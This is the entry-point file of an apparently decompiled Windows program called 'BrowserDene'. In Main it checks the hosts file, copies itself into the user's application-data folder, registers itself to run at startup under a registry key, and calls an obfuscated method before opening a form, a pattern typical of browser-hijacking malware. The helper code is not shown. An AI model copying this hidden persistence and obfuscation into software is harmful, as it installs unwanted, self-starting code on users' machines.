using System;
using System.Threading;
using System.Windows.Forms;

namespace BrowserDene;

internal static class Program
{
	public static Mutex AppMutex = new Mutex(initiallyOwned: true, "{8F6F0AC4-B9A1-45fd-A8CF-72F04X6FDEDT}");

	[STAThread]
	private static void Main()
	{
		if (AppMutex.WaitOne(TimeSpan.Zero, exitContext: true))
		{
			Form1.CheckHostsFile();
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Utils.DstName;
			Utils.DstCheck();
			Utils.Startup(Utils.Regkeyname, path);
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Class2.fPYcDOPz3is7I();
			Form1 form = new Form1();
			Application.Run((Form)(object)form);
			AppMutex.ReleaseMutex();
		}
		else
		{
			Environment.Exit(1);
		}
	}
}
